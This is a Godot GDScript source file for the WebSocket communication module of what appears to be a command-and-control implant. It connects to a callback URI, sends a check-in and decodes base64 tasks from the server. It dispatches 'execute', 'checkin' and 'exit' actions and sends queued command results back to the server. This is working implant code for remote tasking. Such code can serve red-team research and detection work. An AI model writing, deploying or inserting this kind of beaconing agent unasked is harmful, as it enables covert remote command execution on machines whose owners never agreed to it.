extends Node

var time = 0
var time_period = 1
var do_exit = false

var outbound = []

export var websocket_url = "ws://127.0.0.1:3333/ws"

var _client = WebSocketClient.new()

var headers

signal execute
signal checkin

func _ready():
	_client.connect("connection_closed", self, "_closed")
	_client.connect("connection_error", self, "_closed")
	_client.connect("connection_established", self, "_connected")
	_client.connect("data_received", self, "_on_data")
	
	var err = _client.connect_to_url($config.get_callback_uri(), [], false, $config.get_headers())

	if err != OK:
		print("Unable to connect")
		set_process(false)

func _closed(was_clean = false):
	print("Closed, clean: ", was_clean)
	set_process(false)

func _connected(proto = ""):
	print("Connected with protocol: ", proto)

	var ret = _client.get_peer(1).put_packet($api._get_checkin_payload())

	if ret != OK:
		print("failed to send checkin")
	else:
		print("checkin sent")

func _on_data():
	var packet = _client.get_peer(1).get_packet().get_string_from_utf8()
	print(packet)

	var data = Marshalls.base64_to_utf8(packet)
	
	print(data)

	var message_uuid = data.substr(0, 36)
	var message = parse_json(data.substr(36))
	var action = false

	print(message_uuid, message)
	
	if message.has("action"):
		action = message.get("action")

	match action:
		"checkin":
			emit_signal("checkin", message_uuid, message)
		"execute":
			emit_signal("execute", data)
		"exit":
			do_exit = true
		_:
			print("unknown... %s" % data)

func _process(delta):
	time += delta

	if time > time_period:
		_client.poll()

		if $api.checkin_done:
			print("outbound size: %s" % String(outbound.size()))

			time = 0

			if outbound.size() > 0:
				print("sending")
				var ret = _client.get_peer(1).put_packet(outbound.pop_back())
				
				if ret != OK:
					print("failed to send data...")
				else:
					print("data sent")
			elif do_exit:
				close_and_quit()

func _on_execute_command_result(msg):
	print("_on_execute_command_result: appending")
	outbound.append(msg)

func close_and_quit():
	_client.disconnect_from_host()

	yield(get_tree().create_timer(1.0), "timeout")

	get_tree().quit()
